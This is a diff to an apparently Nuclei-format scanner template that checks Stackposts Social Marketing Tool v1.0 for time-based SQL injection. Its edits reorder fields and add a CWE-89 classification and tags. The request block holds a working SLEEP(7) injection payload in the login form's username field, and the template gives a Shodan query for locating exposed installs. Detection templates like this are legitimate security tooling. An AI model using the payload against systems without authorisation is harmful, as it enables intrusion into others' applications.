@@ -1,5 +1,4 @@
 id: stackposts-sqli
-
 info:
   name: Stackposts Social Marketing Tool v1.0 - SQL Injection
   author: r3Y3r53
@@ -10,28 +9,31 @@ info:
     - https://www.exploit-db.com/exploits/51473
     - https://vulners.com/zdt/1337DAY-ID-38725
     - https://codecanyon.net/item/stackposts-social-marketing-tool/21747459
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    verified: true
+    runzero-match: any(each(service["http.bodies"]), {# matches "(?i)stackposts"})
     max-request: 1
     shodan-query: html:"stackposts"
-  tags: sqli,unauth,stackposts
-
+    verified: true
+  tags: sqli,stackposts,time-based-sqli,unauth,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        # digest: 4a0a00473045022100cdb8e465fe37fbd9d7be4660af720464692724688ca343518cdabe9f6545e62b0220141d48c1133b36c00aed7e8a8e7e038cac325dce9abf9dc676157797972a5c31:922c64590222798bb761d5b6d8e72950
+
+        dsl:
+          - duration>=7
+          - contains(content_type, "text/html")
+          - contains(body, "account you entered")
+          - status_code == 200
+        type: dsl
+    raw:
       - |
         @timeout: 15s
-        POST /spre/auth/login HTTP/2
+        POST /spre/auth/login HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
         username=1')AND (SELECT 9595 FROM (SELECT(SLEEP(7)))YRMM) AND ('gaNg'='gaNg&password=test
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'duration>=7'
-          - 'contains(content_type, "text/html")'
-          - 'contains(body, "account you entered")'
-          - 'status_code == 200'
-        condition: and
-# digest: 490a00463044022046129312191be5f5136b54a9cd15cf00156b1df52bc99a74c1c006105e3c38ca02202eecb2827e086fbd287ee49f8e16fa581b9d599b2efdf5f607b5aec946b0b341:922c64590222798bb761d5b6d8e72950
